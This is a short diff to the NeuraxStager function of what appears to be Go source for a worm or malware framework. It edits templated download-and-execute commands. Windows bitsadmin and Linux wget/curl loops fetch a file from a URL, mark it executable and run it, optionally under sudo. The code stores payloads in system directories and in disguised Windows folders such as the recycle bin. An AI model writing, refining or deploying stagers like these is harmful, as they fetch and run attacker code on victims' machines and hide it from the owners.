@@ -225,10 +225,10 @@ func NeuraxStager() string {
 		[]string{"bitsadmin", `for /l %%N in (1 1 RETRY) do bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
 	}
 	linux_stagers := [][]string{
-		[]string{"wget", `for i in {1..RETRY}; do sudo wget -O SAVE_PATH/FILENAME URL; sudo B64 chmod +x SAVE_PATH/FILENAME; sudo SAVE_PATH./FILENAME; done`},
-		[]string{"curl", `for i in {1..RETRY}; do sudo curl URL/FILENAME > SAVE_PATH/FILENAME; sudo B64 chmod +x SAVE_PATH/FILENAME; sudo SAVE_PATH./FILENAME; done`},
+		[]string{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME; done`},
+		[]string{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME; done`},
 	}
-	linux_save_paths := []string{"/tmp", "/lib", "/home",
+	linux_save_paths := []string{"/tmp", "/lib", "~",
 		"/etc", "/usr", "/usr/share"}
 	windows_save_paths := []string{`%SYSTEMDRIVE%\$recycle.bin\`, `%ALLUSERSAPPDATA%\MicrosoftHelp\`}
 	switch N.Platform {
